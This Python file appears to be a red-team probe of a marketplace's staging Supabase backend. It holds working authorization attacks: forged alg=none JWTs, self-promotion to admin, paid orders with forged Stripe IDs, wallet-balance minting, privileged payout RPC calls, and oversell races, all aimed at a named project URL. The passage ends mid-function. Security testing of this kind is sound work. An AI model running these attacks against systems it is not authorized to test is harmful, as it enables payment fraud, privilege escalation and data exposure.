#!/usr/bin/env python3
"""
Fleaber independent blind red-team probe — staging only.
Project: fxdknzrqjenzqcvnwqqq
Does NOT use service_role to demonstrate exploits.
"""
from __future__ import annotations

import json
import os
import random
import string
import sys
import time
import traceback
import urllib.error
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

ROOT = Path(__file__).resolve().parent
OUT_DIR = ROOT
ENV_PATH = Path(__file__).resolve().parents[1] / "live_ops_staging.env"
BASE = "https://fxdknzrqjenzqcvnwqqq.supabase.co"
REST = BASE + "/rest/v1/"
AUTH = BASE + "/auth/v1/"
FN = BASE + "/functions/v1/"
STAGING_REF = "fxdknzrqjenzqcvnwqqq"

matrix: list[dict[str, Any]] = []
findings: list[dict[str, Any]] = []
inventory: dict[str, Any] = {}
invariants: dict[str, Any] = {}
races: list[dict[str, Any]] = []
stripe_tests: list[dict[str, Any]] = []
gaps: list[str] = []
cleanup_ids: dict[str, list[str]] = {
    "products": [],
    "orders": [],
    "chats": [],
}


def load_env(path: Path) -> dict[str, str]:
    env: dict[str, str] = {}
    for line in path.read_text(encoding="utf-8").splitlines():
        line = line.strip()
        if not line or line.startswith("#") or "=" not in line:
            continue
        k, v = line.split("=", 1)
        env[k.strip()] = v.strip()
    return env


def now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


def clip(x: Any, n: int = 800) -> str:
    s = x if isinstance(x, str) else json.dumps(x, ensure_ascii=False, default=str)
    return s if len(s) <= n else s[: n - 3] + "..."


def http(
    method: str,
    url: str,
    *,
    token: str | None = None,
    apikey: str | None = None,
    body: Any = None,
    extra: dict[str, str] | None = None,
    timeout: int = 45,
    prefer: str | None = None,
) -> dict[str, Any]:
    headers = {
        "Accept": "application/json",
        "Content-Type": "application/json",
    }
    key = apikey or ANON
    headers["apikey"] = key
    if token:
        headers["Authorization"] = f"Bearer {token}"
    else:
        headers["Authorization"] = f"Bearer {key}"
    if prefer:
        headers["Prefer"] = prefer
    if extra:
        headers.update(extra)
    data = None
    if body is not None and method.upper() not in ("GET", "HEAD"):
        data = json.dumps(body).encode("utf-8")
    req = urllib.request.Request(url, data=data, headers=headers, method=method.upper())
    t0 = time.time()
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            raw = resp.read().decode("utf-8", errors="replace")
            parsed: Any = raw
            try:
                parsed = json.loads(raw) if raw else None
            except json.JSONDecodeError:
                parsed = raw
            return {
                "ok": 200 <= resp.status < 300,
                "status": resp.status,
                "headers": dict(resp.headers.items()),
                "body": parsed,
                "raw": raw[:4000],
                "ms": int((time.time() - t0) * 1000),
            }
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", errors="replace")
        parsed: Any = raw
        try:
            parsed = json.loads(raw) if raw else None
        except json.JSONDecodeError:
            parsed = raw
        return {
            "ok": False,
            "status": e.code,
            "headers": dict(e.headers.items()) if e.headers else {},
            "body": parsed,
            "raw": raw[:4000],
            "ms": int((time.time() - t0) * 1000),
        }
    except Exception as e:
        return {
            "ok": False,
            "status": 0,
            "headers": {},
            "body": str(e),
            "raw": str(e),
            "ms": int((time.time() - t0) * 1000),
        }


def rest(
    token: str | None,
    method: str,
    path: str,
    *,
    body: Any = None,
    prefer: str | None = "return=representation",
    extra: dict[str, str] | None = None,
    svc: bool = False,
) -> dict[str, Any]:
    tok = SVC if svc else token
    key = SVC if svc else ANON
    url = path if path.startswith("http") else REST + path.lstrip("/")
    return http(method, url, token=tok, apikey=key, body=body, extra=extra, prefer=prefer)


def rpc(token: str | None, name: str, params: dict | None = None, *, svc: bool = False) -> dict[str, Any]:
    return rest(token, "POST", f"rpc/{name}", body=params or {}, svc=svc)


def fn(token: str | None, name: str, body: Any = None, method: str = "POST", qs: str = "") -> dict[str, Any]:
    url = FN + name + (("?" + qs) if qs else "")
    return http(method, url, token=token or ANON, apikey=ANON, body=body)


def rec(
    surface: str,
    attack: str,
    identity: str,
    result: str,
    impact: str,
    severity: str,
    evidence: Any,
    *,
    finding: bool = False,
    title: str | None = None,
    pre: str | None = None,
    repro: str | None = None,
    state: str = "OPEN",
):
    row = {
        "surface": surface,
        "attack": attack,
        "identity": identity,
        "result": result,
        "impact": impact,
        "severity": severity,
        "evidence": clip(evidence, 1200),
        "ts": now_iso(),
    }
    matrix.append(row)
    if finding:
        findings.append(
            {
                "id": f"D-{len(findings)+1:03d}",
                "severity": severity,
                "title": title or attack,
                "actor": identity,
                "preconditions": pre or "",
                "reproduction": repro or attack,
                "impact": impact,
                "state": state,
                "evidence": clip(evidence, 2000),
                "surface": surface,
            }
        )


def sign_in(email: str, password: str) -> dict[str, Any]:
    r = http(
        "POST",
        AUTH + "token?grant_type=password",
        token=ANON,
        apikey=ANON,
        body={"email": email, "password": password},
    )
    body = r.get("body") or {}
    if not isinstance(body, dict) or not body.get("access_token"):
        raise RuntimeError(f"sign_in failed {email}: {clip(r)}")
    return {
        "jwt": body["access_token"],
        "id": body.get("user", {}).get("id"),
        "email": email,
        "refresh": body.get("refresh_token"),
    }


def observe_order(oid: str) -> dict[str, Any]:
    r = rest(
        None,
        "GET",
        f"orders?id=eq.{oid}&select=*",
        svc=True,
        prefer=None,
    )
    rows = r.get("body") if isinstance(r.get("body"), list) else []
    return rows[0] if rows else {}


def observe_product(pid: str) -> dict[str, Any]:
    r = rest(
        None,
        "GET",
        f"products?id=eq.{pid}&select=id,title,price,quantity,seller_id,is_sold,list_on_marketplace,stock_reserved",
        svc=True,
        prefer=None,
    )
    rows = r.get("body") if isinstance(r.get("body"), list) else []
    return rows[0] if rows else {}


def observe_wallet(uid: str) -> dict[str, Any]:
    r = rest(None, "GET", f"wallets?id=eq.{uid}&select=*", svc=True, prefer=None)
    rows = r.get("body") if isinstance(r.get("body"), list) else []
    return rows[0] if rows else {}


def create_product(seller_id: str, *, qty: int, price: float, title: str) -> str:
    payload = {
        "seller_id": seller_id,
        "title": title,
        "price": price,
        "quantity": qty,
        "list_on_marketplace": True,
        "is_sold": False,
        "condition": "Bom",
        "description": "rt-indep-d disposable fixture",
    }
    r = rest(None, "POST", "products", body=payload, svc=True)
    body = r.get("body")
    if isinstance(body, list) and body:
        pid = body[0]["id"]
    elif isinstance(body, dict) and body.get("id"):
        pid = body["id"]
    else:
        raise RuntimeError(f"product insert failed: {clip(r)}")
    cleanup_ids["products"].append(pid)
    return pid


def buyer_insert_order(buyer_jwt: str, payload: dict[str, Any]) -> dict[str, Any]:
    return rest(buyer_jwt, "POST", "orders", body=payload)


def patch_order(token: str, oid: str, data: dict[str, Any]) -> dict[str, Any]:
    return rest(token, "PATCH", f"orders?id=eq.{oid}", body=data)


# ---------------------------------------------------------------------------
# PASS 1 — coverage
# ---------------------------------------------------------------------------

def pass1_inventory():
    spec = http(
        "GET",
        REST,
        token=ANON,
        extra={"Accept": "application/openapi+json"},
        prefer=None,
    )
    paths = []
    tables = []
    rpcs = []
    body = spec.get("body")
    if isinstance(body, dict):
        for p in (body.get("paths") or {}):
            paths.append(p)
            if p.startswith("/rpc/"):
                rpcs.append(p.replace("/rpc/", ""))
            elif p.startswith("/") and "{" not in p:
                tables.append(p.strip("/"))
    inventory["openapi_status"] = spec["status"]
    inventory["table_count"] = len(tables)
    inventory["rpc_count"] = len(rpcs)
    inventory["tables"] = sorted(set(tables))
    inventory["rpcs"] = sorted(set(rpcs))
    rec(
        "INVENTORY",
        "openapi",
        "anon",
        f"tables={len(tables)} rpcs={len(rpcs)} http={spec['status']}",
        "surface map",
        "INFO",
        {"tables": tables[:40], "rpcs": rpcs[:80]},
    )


def pass1_anon_rls():
    tables = [
        "orders",
        "products",
        "profiles",
        "wallets",
        "wallet_transactions",
        "wallet_ledger",
        "wallet_payout_ledger",
        "chats",
        "chat_messages",
        "reviews",
        "reviews_gerais",
        "order_disputes",
        "order_dispute_replies",
        "lives",
        "live_items",
        "live_reservation_requests",
        "live_raffles",
        "live_raffle_winners",
        "live_tips",
        "product_offers",
        "product_bundles",
        "seller_bundle_discounts",
        "stripe_checkout_events",
        "fleaber_commissions",
        "ps_ingest_audit",
        "ps_pairing",
        "seller_helpers",
        "staff_action_logs",
        "user_notifications",
        "favorites",
        "follows",
    ]
    sensitive_cols = {
        "lives": "id,seller_id,mux_stream_key,stream_key,mux_live_id,status",
        "profiles": "id,email,phone,iban,mb_way,user_type,full_name",
        "wallets": "id,balance,stripe_account_id",
        "orders": "id,buyer_id,seller_id,status,price_total,stripe_payment_intent_id,amount_paid_cents",
        "chat_messages": "id,chat_id,sender_id,text",
        "wallet_payout_ledger": "id,user_id,amount_cents,status,stripe_transfer_id",
    }
    for t in tables:
        sel = sensitive_cols.get(t, "*")
        r = rest(None, "GET", f"{t}?select={sel}&limit=3", prefer=None)
        rows = r.get("body") if isinstance(r.get("body"), list) else []
        leaked = r["ok"] and len(rows) > 0
        keys_leak = False
        if t == "lives" and rows:
            for row in rows:
                for k in ("mux_stream_key", "stream_key"):
                    v = str(row.get(k) or "").strip()
                    if v:
                        keys_leak = True
        rec(
            "RLS",
            f"anon SELECT {t}",
            "anon",
            f"http={r['status']} n={len(rows) if isinstance(rows, list) else 'na'} keys_leak={keys_leak}",
            "stream key leak" if keys_leak else ("data exposure" if leaked else "blocked or empty"),
            "P1" if keys_leak else ("P2" if leaked and t in ("orders", "chats", "wallets", "profiles", "chat_messages", "order_disputes") else "INFO"),
            clip(rows[:2] if rows else r.get("body")),
            finding=keys_leak or (leaked and t in ("wallets", "wallet_payout_ledger", "order_disputes", "chat_messages")),
            title=f"Anon SELECT {t} leaked rows" if leaked else None,
        )
        # hostile writes
        ins = rest(None, "POST", t, body={"id": "00000000-0000-0000-0000-000000000001"})
        rec(
            "RLS",
            f"anon INSERT {t}",
            "anon",
            f"http={ins['status']}",
            "write" if ins["ok"] else "blocked",
            "P1" if ins["ok"] else "INFO",
            clip(ins.get("body")),
            finding=ins["ok"],
            title=f"Anon INSERT {t}",
        )


def pass1_auth_jwt(buyer, seller, buyer2):
    # alg=none
    import base64

    def b64url(obj) -> str:
        raw = json.dumps(obj, separators=(",", ":")).encode()
        return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()

    fake = ".".join(
        [
            b64url({"alg": "none", "typ": "JWT"}),
            b64url({"role": "service_role", "iss": "supabase", "ref": STAGING_REF, "sub": buyer["id"]}),
            "",
        ]
    )
    r = rest(fake, "GET", "wallets?select=*&limit=5", prefer=None)
    rec(
        "AUTH",
        "JWT alg=none service_role claim",
        "forged",
        f"http={r['status']}",
        "admin impersonation" if r["ok"] else "rejected",
        "P0" if r["ok"] else "INFO",
        clip(r.get("body")),
        finding=r["ok"],
        title="alg=none JWT accepted",
    )
    # buyer escalate user_type
    before = rest(buyer["jwt"], "GET", f"profiles?id=eq.{buyer['id']}&select=id,user_type", prefer=None)
    patch = rest(buyer["jwt"], "PATCH", f"profiles?id=eq.{buyer['id']}", body={"user_type": "admin"})
    after = rest(None, "GET", f"profiles?id=eq.{buyer['id']}&select=id,user_type", svc=True, prefer=None)
    after_row = (after.get("body") or [{}])[0] if isinstance(after.get("body"), list) else {}
    escalated = str(after_row.get("user_type") or "").lower() in (
        "admin",
        "admim",
        "administrador",
        "vendedor",
        "seller",
    ) and str(((before.get("body") or [{}])[0] if isinstance(before.get("body"), list) else {}).get("user_type") or "").lower() not in (
        "admin",
        "vendedor",
        "seller",
    )
    rec(
        "AUTH",
        "buyer PATCH profiles.user_type=admin",
        "buyer",
        f"http={patch['status']} after={after_row.get('user_type')}",
        "admin/seller impersonation" if escalated else "blocked or unchanged",
        "P0" if escalated else "INFO",
        {"patch": clip(patch.get("body")), "after": after_row},
        finding=escalated,
        title="Buyer self-promoted to admin",
    )
    # restore if needed
    if escalated:
        rest(None, "PATCH", f"profiles?id=eq.{buyer['id']}", body={"user_type": "comprador"}, svc=True)
    # seller patch buyer profile
    x = rest(seller["jwt"], "PATCH", f"profiles?id=eq.{buyer['id']}", body={"full_name": "HACKED"})
    rec("AUTH", "seller PATCH buyer profile", "seller", f"http={x['status']}", "cross-user", "P1" if x["ok"] else "INFO", clip(x.get("body")), finding=x["ok"])
    # admin RPC
    for name, params in [
        ("batata_admin_list_profiles", {"p_limit": 5}),
        ("batata_generate_auto_feedback", {}),
        ("batata_wallet_payout_debit", {"p_user_id": buyer["id"], "p_amount_cents": 100, "p_idempotency_key": "rt_d_debit_x"}),
        ("batata_wallet_payout_finish", {"p_idempotency_key": "rt_d_debit_x", "p_stripe_transfer_id": "tr_fake"}),
        ("batata_credit_wallet_once", {"p_user_id": buyer["id"], "p_amount": 50, "p_type": "reembolso", "p_description": "rt"}),
    ]:
        rb = rpc(buyer["jwt"], name, params)
        rec(
            "RPC",
            f"buyer {name}",
            "buyer",
            f"http={rb['status']}",
            "privileged RPC",
            "P0" if rb["ok"] and name.startswith("batata_wallet_payout") else ("P1" if rb["ok"] and "admin" in name else "INFO"),
            clip(rb.get("body")),
            finding=rb["ok"] and name in ("batata_admin_list_profiles", "batata_wallet_payout_debit", "batata_credit_wallet_once"),
            title=f"Buyer executed {name}",
        )


def pass1_orders_money(buyer, seller, buyer2, pid_cheap: str, pid_qty1: str):
    # legitimate hold
    legit = buyer_insert_order(
        buyer["jwt"],
        {
            "product_id": pid_cheap,
            "buyer_id": buyer["id"],
            "seller_id": seller["id"],
            "price_total": 1.00,
            "status": "reserva_pendente",
            "payment_method": "Pagamento na App",
            "shipping_method": "hand",
            "quantity": 1,
            "is_reservation": False,
        },
    )
    oid = None
    if legit["ok"]:
        b = legit["body"]
        oid = (b[0]["id"] if isinstance(b, list) else b.get("id")) if b else None
        if oid:
            cleanup_ids["orders"].append(oid)
    rec("ORDERS", "buyer insert legitimate hold", "buyer", f"http={legit['status']} id={oid}", "fixture", "INFO", clip(legit.get("body")))

    # INSERT paid + stripe ids + amount_paid
    hostile = buyer_insert_order(
        buyer["jwt"],
        {
            "product_id": pid_cheap,
            "buyer_id": buyer["id"],
            "seller_id": seller["id"],
            "price_total": 0.01,
            "status": "pago",
            "payment_method": "Pagamento na App",
            "quantity": 1,
            "amount_paid_cents": 999999,
            "stripe_payment_intent_id": "pi_hostile_rt_d",
            "stripe_checkout_session_id": "cs_hostile_rt_d",
            "contract_unit_cents": 1,
            "contract_qty": 1,
        },
    )
    hrow = None
    if hostile["ok"]:
        bb = hostile["body"]
        hrow = bb[0] if isinstance(bb, list) else bb
        if hrow and hrow.get("id"):
            cleanup_ids["orders"].append(hrow["id"])
            final = observe_order(hrow["id"])
            paid = str(final.get("status") or "").lower() == "pago"
            minted = (final.get("amount_paid_cents") or 0) and paid
            rec(
                "ORDERS",
                "buyer INSERT status=pago + amount_paid + stripe IDs",
                "buyer",
                f"http={hostile['status']} persisted_status={final.get('status')} paid_cents={final.get('amount_paid_cents')} pi={final.get('stripe_payment_intent_id')}",
                "fake capture / wallet mint path",
                "P0" if minted or (paid and final.get("stripe_payment_intent_id") == "pi_hostile_rt_d") else ("P1" if paid else "INFO"),
                final,
                finding=paid or bool(final.get("amount_paid_cents")),
                title="Buyer inserted paid order with forged Stripe/amount fields",
            )
            # try wallet release on this forged paid order
            rel = rpc(seller["jwt"], "batata_release_seller_wallet_for_order", {"p_order_id": hrow["id"]})
            w_after = observe_wallet(seller["id"])
            rec(
                "WALLET",
                "seller release wallet on JWT-forged paid order",
                "seller",
                f"http={rel['status']} body={clip(rel.get('body'),200)} bal={w_after.get('balance')}",
                "mint without platform funds",
                "P0" if rel["ok"] and rel.get("body") is True else "INFO",
                {"rpc": clip(rel.get("body")), "wallet": w_after},
                finding=rel["ok"] and rel.get("body") is True,
                title="Wallet credited from JWT-forged paid order",
            )
    else:
        rec("ORDERS", "buyer INSERT status=pago + amount_paid + stripe IDs", "buyer", f"http={hostile['status']}", "blocked", "INFO", clip(hostile.get("body")))

    # INSERT as other buyer
    xuser = buyer_insert_order(
        buyer["jwt"],
        {
            "product_id": pid_cheap,
            "buyer_id": buyer2["id"],
            "seller_id": seller["id"],
            "price_total": 5,
            "status": "reserva_pendente",
            "quantity": 1,
        },
    )
    rec(
        "AUTHORITY",
        "buyer INSERT order as other buyer_id",
        "buyer",
        f"http={xuser['status']}",
        "party swap",
        "P1" if xuser["ok"] else "INFO",
        clip(xuser.get("body")),
        finding=xuser["ok"],
        title="Buyer created order in another buyer's name",
    )
    if xuser["ok"]:
        bb = xuser["body"]
        xid = (bb[0]["id"] if isinstance(bb, list) else bb.get("id")) if bb else None
        if xid:
            cleanup_ids["orders"].append(xid)

    # qty huge / zero / negative
    for q, label in [(0, "qty=0"), (-3, "qty=-3"), (10**9, "qty=1e9"), (99, "qty=99")]:
        r = buyer_insert_order(
            buyer["jwt"],
            {
                "product_id": pid_qty1,
                "buyer_id": buyer["id"],
                "seller_id": seller["id"],
                "price_total": 5,
                "status": "reserva_pendente",
                "quantity": q,
            },
        )
        persisted = None
        if r["ok"]:
            bb = r["body"]
            row = bb[0] if isinstance(bb, list) else bb
            if row and row.get("id"):
                cleanup_ids["orders"].append(row["id"])
                persisted = observe_order(row["id"])
        oversell_hold = r["ok"] and persisted and int(persisted.get("quantity") or 0) > 1
        rec(
            "QUANTITY",
            f"buyer INSERT {label} on stock=1 product",
            "buyer",
            f"http={r['status']} persisted_qty={(persisted or {}).get('quantity')}",
            "capacity bypass" if oversell_hold else "blocked or clamped",
            "P1" if oversell_hold else "INFO",
            persisted or clip(r.get("body")),
            finding=bool(oversell_hold),
            title=f"Order accepted with {label} on stock=1",
        )

    # PATCH price/qty/status/stripe on own order
    if oid:
        before = observe_order(oid)
        attempts = [
            ("price_total=0.01", {"price_total": 0.01}),
            ("quantity=99", {"quantity": 99}),
            ("contract_unit_cents=1", {"contract_unit_cents": 1}),
            ("contract_qty=99", {"contract_qty": 99}),
            ("status=pago", {"status": "pago"}),
            ("status=concluido", {"status": "concluido"}),
            ("amount_paid_cents", {"amount_paid_cents": 1}),
            ("stripe_pi", {"stripe_payment_intent_id": "pi_patched"}),
            ("seller_id swap", {"seller_id": buyer["id"]}),
            ("buyer_id swap", {"buyer_id": buyer2["id"]}),
            ("product swap", {"product_id": pid_qty1}),
        ]
        for label, data in attempts:
            r = patch_order(buyer["jwt"], oid, data)
            after = observe_order(oid)
            changed = any(after.get(k) != before.get(k) for k in data)
            # refresh before for next
            severe = label.startswith("status=pago") or label.startswith("amount") or label.startswith("stripe") or "swap" in label
            rec(
                "ORDERS",
                f"buyer PATCH own {label}",
                "buyer",
                f"http={r['status']} changed={changed} after={ {k: after.get(k) for k in data} }",
                "authority" if changed else "blocked",
                "P0" if changed and severe else ("P1" if changed and label in ("price_total=0.01", "quantity=99", "contract_unit_cents=1") else "INFO"),
                {"before": {k: before.get(k) for k in data}, "after": {k: after.get(k) for k in data}, "resp": clip(r.get("body"), 300)},
                finding=changed and severe or (changed and label in ("price_total=0.01", "quantity=99", "contract_unit_cents=1", "contract_qty=99")),
                title=f"Buyer patched {label}",
            )
            before = after

        # seller patch foreign order
        r = patch_order(seller["jwt"], oid, {"price_total": 0.01, "status": "pago"})
        after = observe_order(oid)
        rec(
            "ORDERS",
            "seller PATCH buyer hold to pago/cheap",
            "seller",
            f"http={r['status']} status={after.get('status')} price={after.get('price_total')}",
            "seller-side fake payment",
            "P1" if str(after.get("status")).lower() == "pago" else "INFO",
            after,
            finding=str(after.get("status")).lower() == "pago",
            title="Seller marked unpaid hold as pago",
        )

        # buyer2 patch
        r = patch_order(buyer2["jwt"], oid, {"status": "pago"})
        rec("ORDERS", "other buyer PATCH order", "buyer2", f"http={r['status']}", "cross-user", "P1" if r["ok"] else "INFO", clip(r.get("body")), finding=r["ok"])

    return oid


def pass1_checkout(buyer, seller, oid: str | None, pid: str):
    if not oid:
        rec("CHECKOUT", "skip — no order", "buyer", "n/a", "gap", "INFO", "no order")
        gaps.append("checkout: no hold order")
        return
    # hostile amounts / prize / qty in body
    payloads = [
        ("amount=50 vs contract", {"order_id": oid, "buyer_id": buyer["id"], "amount": 50, "shipping_method": "hand", "product_id": pid}),
        ("prize_shipping true", {"order_id": oid, "buyer_id": buyer["id"], "prize_shipping": True, "shipping_method": "carrier"}),
        ("qty 99 in body", {"order_id": oid, "buyer_id": buyer["id"], "quantity": 99, "item_price": 0.01, "shipping_method": "hand"}),
        ("seller_id swap", {"order_id": oid, "buyer_id": buyer["id"], "seller_id": buyer["id"], "shipping_method": "hand"}),
        ("missing auth buyer_id mismatch", {"order_id": oid, "buyer_id": seller["id"], "shipping_method": "hand"}),
        ("carrier vs hand", {"order_id": oid, "buyer_id": buyer["id"], "shipping_method": "carrier"}),
        ("garbage shipping", {"order_id": oid, "buyer_id": buyer["id"], "shipping_method": "free"}),
        ("live_id inject", {"order_id": oid, "buyer_id": buyer["id"], "shipping_method": "hand", "live_id": "00000000-0000-0000-0000-000000000099"}),
    ]
    session_ids = []
    amounts = []
    for label, body in payloads:
        r = fn(buyer["jwt"], "create-payment-intent", body)
        amt = None
        if isinstance(r.get("body"), dict):
            amt = r["body"].get("server_amount_cents")
            if r["body"].get("checkoutSessionId"):
                session_ids.append(r["body"]["checkoutSessionId"])
                amounts.append(amt)
        rec(
            "CHECKOUT",
            f"POST create-payment-intent {label}",
            "buyer",
            f"http={r['status']} amt={amt} err={clip((r.get('body') or {}),200) if not r['ok'] else 'ok'}",
            "price authority",
            "P0" if r["ok"] and label.startswith("amount=50") and amt is not None and amt <= 50 else "INFO",
            clip(r.get("body")),
            finding=bool(r["ok"] and label.startswith("amount=50") and amt is not None and amt <= 200),
            title="Checkout honored client amount",
        )
        stripe_tests.append({"label": label, "http": r["status"], "amount": amt, "ok": r["ok"], "body": clip(r.get("body"), 400)})

    # seller calling checkout on buyer's order
    r = fn(seller["jwt"], "create-payment-intent", {"order_id": oid, "buyer_id": buyer["id"], "shipping_method": "hand"})
    rec("CHECKOUT", "seller checkout buyer's order", "seller", f"http={r['status']}", "party swap", "P1" if r["ok"] else "INFO", clip(r.get("body")), finding=r["ok"])

    # anon checkout
    r = fn(None, "create-payment-intent", {"order_id": oid, "buyer_id": buyer["id"], "shipping_method": "hand"})
    rec("CHECKOUT", "anon checkout", "anon", f"http={r['status']}", "unauth pay", "P1" if r["ok"] else "INFO", clip(r.get("body")), finding=r["ok"])

    # GET settle fake session
    r = fn(None, "create-payment-intent", None, method="GET", qs="checkout_return=success&session_id=cs_test_fake_rt_d")
    rec("CHECKOUT", "GET settle fake session_id", "anon", f"http={r['status']}", "unauth settle", "INFO", clip(r.get("raw"), 300))

    # bag mixed - need second order
    o2 = buyer_insert_order(
        buyer["jwt"],
        {
            "product_id": pid,
            "buyer_id": buyer["id"],
            "seller_id": seller["id"],
            "price_total": 5,
            "status": "reserva_pendente",
            "quantity": 1,
            "shipping_method": "hand",
            "payment_method": "Pagamento na App",
        },
    )
    oid2 = None
    if o2["ok"]:
        bb = o2["body"]
        oid2 = (bb[0]["id"] if isinstance(bb, list) else bb.get("id")) if bb else None
        if oid2:
            cleanup_ids["orders"].append(oid2)
    if oid and oid2:
        r = fn(
            buyer["jwt"],
            "create-payment-intent",
            {
                "order_id": oid,
                "buyer_id": buyer["id"],
                "shipping_method": "hand",
                "bag_checkout": True,
                "bag_lines": [
                    {"order_id": oid, "line_total_cents": 1},
                    {"order_id": oid2, "line_total_cents": 1},
                ],
            },
        )
        rec("CHECKOUT", "bag checkout two holds same seller line_total=1", "buyer", f"http={r['status']} amt={(r.get('body') or {}).get('server_amount_cents') if isinstance(r.get('body'), dict) else None}", "bag price", "INFO", clip(r.get("body")))

    # fase2 settle with buyer jwt
    r = fn(buyer["jwt"], "create-payment-intent", {"order_id": oid, "payment_intent_id": "pi_x"}, qs="fase2_e2e_settle=1")
    rec("CHECKOUT", "fase2_e2e_settle with buyer JWT", "buyer", f"http={r['status']}", "privileged settle", "P0" if r["ok"] else "INFO", clip(r.get("body")), finding=r["ok"])

    # oversell e2e edge
    r = fn(buyer["jwt"], "sec-fase2-e2e-oversell", {"buyer_id": buyer["id"], "seller_id": seller["id"]})
    rec("EDGE", "sec-fase2-e2e-oversell buyer JWT", "buyer", f"http={r['status']}", "privileged pay+settle", "P0" if r["ok"] else "INFO", clip(r.get("body")), finding=r["ok"])

    return session_ids


def pass1_wallet(buyer, seller, oid):
    w_b0 = observe_wallet(buyer["id"])
    w_s0 = observe_wallet(seller["id"])
    # direct table writes
    for ident, tok, uid in [("buyer", buyer["jwt"], buyer["id"]), ("seller", seller["jwt"], seller["id"])]:
        r = rest(tok, "PATCH", f"wallets?id=eq.{uid}", body={"balance": 9999.99})
        after = observe_wallet(uid)
        rec(
            "WALLET",
            f"{ident} PATCH wallets.balance",
            ident,
            f"http={r['status']} bal={after.get('balance')}",
            "direct mint",
            "P0" if float(after.get("balance") or 0) >= 9999 else "INFO",
            after,
            finding=float(after.get("balance") or 0) >= 9999,
            title=f"{ident} wrote wallet balance via PostgREST",
        )
        r = rest(tok, "POST", "wallet_transactions", body={"wallet_id": uid, "amount": 100, "type": "venda", "description": "rt"})
        rec("WALLET", f"{ident} INSERT wallet_transactions", ident, f"http={r['status']}", "ledger forge", "P1" if r["ok"] else "INFO", clip(r.get("body")), finding=r["ok"])
        r = rest(tok, "POST", "wallet_ledger", body={"user_id": uid, "amount_cents": 10000, "entry_type": "credit"})
        rec("WALLET", f"{ident} INSERT wallet_ledger", ident, f"http={r['status']}", "ledger forge", "P1" if r["ok"] else "INFO", clip(r.get("body")), finding=r["ok"])

    r = rpc(buyer["jwt"], "batata_ensure_wallet", {"p_user_id": seller["id"]})
    rec("WALLET", "buyer ensure_wallet(seller)", "buyer", f"http={r['status']}", "cross-user helper", "P2" if r["ok"] else "INFO", clip(r.get("body")))

    r = rpc(buyer["jwt"], "batata_refund_buyer_wallet_for_order", {"p_order_id": oid} if oid else {})
    rec("WALLET", "buyer refund_buyer_wallet_for_order on hold", "buyer", f"http={r['status']}", "unearned refund", "P1" if r["ok"] and r.get("body") is True else "INFO", clip(r.get("body")), finding=r["ok"] and r.get("body") is True)

    r = rpc(buyer["jwt"], "batata_release_seller_wallet_for_order", {"p_order_id": oid} if oid else {})
    rec("WALLET", "buyer release seller wallet", "buyer", f"http={r['status']}", "cross-role release", "P1" if r["ok"] and r.get("body") is True else "INFO", clip(r.get("body")), finding=r["ok"] and r.get("body") is True)

    # payout edge
    r = fn(buyer["jwt"], "create-connect-account", {"user_id": seller["id"], "amount": 100, "idempotency_key": "rt_d_payout_xuser_001"})
    rec("PAYOUT", "buyer payout as seller user_id", "buyer", f"http={r['status']}", "payout identity swap", "P0" if r["ok"] and isinstance(r.get("body"), dict) and r["body"].get("success") else "INFO", clip(r.get("body")), finding=r["ok"] and isinstance(r.get("body"), dict) and r["body"].get("success"))

    r = fn(seller["jwt"], "create-connect-account", {"user_id": seller["id"], "amount": 99999999, "idempotency_key": "rt_d_payout_huge_001"})
    rec("PAYOUT", "seller payout 99999999 cents", "seller", f"http={r['status']}", "over-balance payout", "P1" if r["ok"] and isinstance(r.get("body"), dict) and r["body"].get("success") else "INFO", clip(r.get("body")))

    invariants["wallet_direct_write"] = "blocked" if float(observe_wallet(buyer["id"]).get("balance") or 0) < 9999 else "BROKEN"
    invariants["wallet_start_buyer"] = w_b0.get("balance")
    invariants["wallet_start_seller"] = w_s0.get("balance")


def pass1_stock(buyer, seller, pid_qty1: str):
    # two concurrent inserts qty=1
    payload = {
        "product_id": pid_qty1,
        "buyer_id": buyer["id"],
        "seller_id": seller["id"],
        "price_total": 5,
        "status": "reserva_pendente",
        "quantity": 1,
        "payment_method": "Pagamento na App",
    }

    def one(_):
        return buyer_insert_order(buyer["jwt"], payload)

    results = []
    with ThreadPoolExecutor(max_workers=8) as ex:
        futs = [ex.submit(one, i) for i in range(8)]
        for f in as_completed(futs):
            results.append(f.result())
    oks = [r for r in results if r["ok"]]
    oids = []
    for r in oks:
        bb = r["body"]
        row = bb[0] if isinstance(bb, list) else bb
        if row and row.get("id"):
            oids.append(row["id"])
            cleanup_ids["orders"].append(row["id"])
    prod = observe_product(pid_qty1)
    races.append({"name": "8 concurrent holds stock=1", "ok": len(oks), "ids": oids, "product": prod})
    rec(
        "STOCK",
        "8 concurrent INSERT qty=1 holds on stock=1",
        "buyer",
        f"accepted={len(oks)} product_qty={prod.get('quantity')}",
        "oversell holds (not yet capture)",
        "P2" if len(oks) > 1 else "INFO",
        {"accepted": len(oks), "product": prod},
    )

    # buyer patch product stock/price
    r = rest(buyer["jwt"], "PATCH", f"products?id=eq.{pid_qty1}", body={"quantity": 999, "price": 0.01})
    after = observe_product(pid_qty1)
    rec(
        "CATALOG",
        "buyer PATCH product qty/price",
        "buyer",
        f"http={r['status']} qty={after.get('quantity')} price={after.get('price')}",
        "catalog authority",
        "P1" if int(after.get("quantity") or 0) == 999 or float(after.get("price") or 9) < 1 else "INFO",
        after,
        finding=int(after.get("quantity") or 0) == 999 or (after.get("price") is not None and float(after["price"]) < 1),
        title="Buyer mutated seller catalog",
    )


def pass1_reviews_chat_privacy(buyer, seller, buyer2, oid):
    # reviews insert without order
    r = rest(
        buyer["jwt"],
        "POST",
        "reviews",
        body={
            "target_id": seller["id"],
            "buyer_id": buyer["id"],
            "stars": 1,
            "comment": "rt-d forged",
            "target_type": "seller",
            "author_role": "buyer",
            "order_id": oid,
        },
    )
    rec("REVIEWS", "buyer INSERT review", "buyer", f"http={r['status']}", "reputation", "P1" if r["ok"] else "INFO", clip(r.get("body")), finding=r["ok"], title="Review inserted without completed trade")
    # as other identity
    r = rest(
        buyer["jwt"],
        "POST",
        "reviews",
        body={
            "target_id": seller["id"],
            "buyer_id": buyer2["id"],
            "stars": 5,
            "comment": "forged identity",
            "target_type": "seller",
            "author_role": "buyer",
        },
    )
